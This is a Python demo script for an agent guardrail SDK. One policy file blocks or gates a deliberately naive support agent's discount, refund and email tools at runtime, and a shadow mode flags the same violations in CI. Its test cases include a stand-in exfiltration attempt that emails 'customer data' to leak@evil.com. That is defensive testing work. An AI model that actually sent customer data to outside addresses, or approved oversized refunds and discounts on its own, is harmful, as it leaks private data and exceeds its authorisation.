"""The sharp demo: one policy file makes an unsafe support agent safe.

A naive sales/support agent will apply any discount, refund any amount, and email
anyone. We wrap its tools with Amanai and load ONE policy file. The same file:

  * blocks unsafe actions at runtime (enforce mode), and
  * flags would-be violations in CI from a recorded trace (shadow mode).

Run (no install needed):
    PYTHONPATH=packages/sdk-python python examples/action_policy_demo.py
"""

import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "packages" / "sdk-python"))
from amanai import (  # noqa: E402
    ApprovalRequired,
    ToolBlocked,
    collect_trace,
    set_context,
    set_mode,
    set_policy,
    tool,
)
from amanai.testing import assert_no_violations  # noqa: E402

POLICY = pathlib.Path(__file__).parent / "action.policy.json"


# ── the agent's tools — naive on purpose; the policy is the only guardrail ─────
@tool
def apply_discount(pct: int) -> dict:
    return {"ok": True, "pct": pct}


@tool
def refund_payment(amount: int) -> dict:
    return {"ok": True, "amount": amount}


@tool(capability="external_comms", risk="high")
def send_email(to: str, body: str) -> dict:
    return {"ok": True, "to": to}


def demo() -> None:
    set_policy(POLICY)
    print(f"loaded {POLICY.name}\n")

    # ── 1. Runtime enforcement (enforce mode is the default) ──────────────────
    set_context(role="support", environment="prod")
    print("RUNTIME (enforce):")

    assert apply_discount(pct=10) == {"ok": True, "pct": 10}
    print("  apply_discount(10%)  -> allowed")

    try:
        apply_discount(pct=90)
        raise AssertionError("expected ToolBlocked")
    except ToolBlocked as e:
        print(f"  apply_discount(90%)  -> BLOCKED ({e})")

    try:
        refund_payment(amount=500)
        raise AssertionError("expected ApprovalRequired")
    except ApprovalRequired as e:
        print(f"  refund_payment($500) -> APPROVAL ({e.pending.token})")

    try:
        send_email(to="leak@evil.com", body="customer data")
        raise AssertionError("expected ToolBlocked")
    except ToolBlocked as e:
        print(f"  send_email(external) -> BLOCKED ({e})")

    # A clean trace: the dangerous calls never executed, so CI is satisfied.
    assert_no_violations(collect_trace())
    print("  CI: no violating tool-call executed -> PASS\n")

    # ── 2. Same policy, shadow mode: catch regressions in CI before shipping ──
    set_mode("shadow")
    print("CI (shadow over an attack trace):")
    apply_discount(pct=90)  # would be blocked
    send_email(to="leak@evil.com", body="data")  # would be blocked
    attack_trace = collect_trace()
    violations = [e for e in attack_trace if e.decision.outcome in ("block", "require_approval")]
    assert violations, "shadow mode should record would-be violations"
    for e in violations:
        print(f"  {e.action.tool} would violate [{e.decision.rule_id}]: {e.decision.reason}")
    print(f"  CI: {len(violations)} would-be violation(s) -> FAIL the build\n")

    print("PASS — one policy file enforced at runtime and asserted in CI.")


if __name__ == "__main__":
    demo()
